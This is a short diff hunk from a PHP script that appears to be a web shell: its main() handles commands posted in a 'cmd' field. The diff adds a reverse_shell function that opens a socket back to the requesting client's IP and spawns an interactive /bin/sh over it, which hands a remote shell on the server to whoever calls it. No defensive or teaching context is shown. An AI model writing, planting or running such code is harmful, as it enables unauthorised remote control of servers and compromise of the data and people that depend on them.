@@ -25,6 +25,12 @@ function systemInfo(){
     }
 }
 
+function reverse_shell($port){
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $sock = fsockopen("$ip",$port);
+    exec('/bin/sh -i <&3 >&3 2>&3');
+}
+
 function main() {
     if(isset($_POST['cmd'])) {
         $resp = post_request();
